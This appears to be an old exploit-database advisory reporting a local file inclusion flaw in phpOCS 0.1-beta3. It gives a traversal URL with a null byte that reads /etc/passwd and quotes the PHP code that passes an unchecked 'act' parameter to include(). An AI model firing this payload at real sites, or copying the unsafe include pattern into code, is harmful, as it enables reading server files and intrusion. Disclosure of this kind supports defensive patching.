@@ -1,0 +1,58 @@
+
+  :::::::-.   ...    ::::::.    :::.
+   ;;,   `';, ;;     ;;;`;;;;,  `;;;
+   `[[     [[[['     [[[  [[[[[. '[[
+    $$,    $$$$      $$$  $$$ "Y$c$$
+    888_,o8P'88    .d888  888    Y88
+    MMMMP"`   "YmmMMMM""  MMM     YM
+
+   [ Discovered by dun \ dun[at]strcpy.pl ]
+
+ ###################################################################
+ #  [ phpOCS <= 0.1-beta3 ]   Local File Inclusion Vulnerability   #
+ ###################################################################
+ #
+ # Script: "phpOCS is a fully featured Online Community System. It has fully customisable message boards, calendars, galleries and articles."
+ #
+ # Script site: http://phpocs.sourceforge.net/
+ # Download: http://sourceforge.net/projects/phpocs/
+ #
+ # Vuln: 
+ # http://site.com/[phpocs-0.1-beta3]/index.php?act=../../../../../../../etc/passwd%00
+ #     
+ #
+ # Bug: ./phpocs-0.1-beta3/index.php (lines: 7 and 9)
+ #
+ # ...
+ # 7:     include("library/include.inc.php");   	// (1);
+ # 9:     makepage();					// (2);
+ # ... 			    
+ #
+ #
+ # Bug: ./phpocs-0.1-beta3/library/pagefunctions.inc.php (lines: 3-104)
+ #
+ # ...
+ # 3:     function makepage() {
+ # ...    // (lines: 72-79)
+ #   	if (isset($_GET['act']))
+ #		{
+ #		include("library/{$_GET['act']}.php"); 	// (3) LFI
+ #		}
+ #	else
+ #		{
+ #		include("library/home.php");
+ #		}
+ # ...
+ # 104:   }
+ # ... 			    
+ #
+ #
+ ###############################################
+ # Greetz: D3m0n_DE * str0ke * and otherz..
+ ###############################################
+
+ [ dun / 2008 ] 
+
+*******************************************************************************************
+
+# milw0rm.com [2008-09-25]
